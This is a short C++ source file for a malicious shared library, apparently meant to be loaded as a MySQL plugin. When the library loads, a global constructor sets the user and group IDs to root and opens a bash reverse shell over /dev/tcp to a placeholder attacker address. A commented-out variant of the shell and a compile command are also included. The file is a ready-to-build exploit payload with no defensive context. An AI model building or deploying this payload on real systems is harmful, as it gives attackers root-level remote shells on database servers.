#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
void lshell(){
    //setenv("LD_PRELOAD", "/empty.ld.so", true);
    //unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("bash -c 'bash -i >& /dev/tcp/your_ip_address/8777 0>&1 &'");
}
//bash -c 'bash -i >& /dev/tcp/your_ip_address/8666 0>&1'
class LOLITA {
public:
    LOLITA(){
        lshell();
    }
};
LOLITA lolita;
LOLITA* _mysql_plugin_interface_version_ = &lolita;
//compile: g++ expso.cpp -shared -fPIC -o exp.so